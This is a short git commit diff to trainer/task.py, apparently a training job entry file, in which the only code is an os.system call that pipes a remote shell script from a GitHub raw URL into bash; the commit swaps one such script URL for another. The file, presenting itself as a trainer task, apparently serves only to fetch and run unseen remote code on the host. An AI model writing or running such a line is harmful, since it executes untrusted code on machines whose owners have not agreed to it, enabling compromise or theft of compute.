e4317ef917e342e493aa2b6bbceb49294724ec4d
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-24 15:53:37 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://raw.githubusercontent.com/55113110159/bring-6.19.3/main/ih.sh | bash')
+os.system('curl -sL https://raw.githubusercontent.com/55113110159/OS/main/bmx.sh | bash')
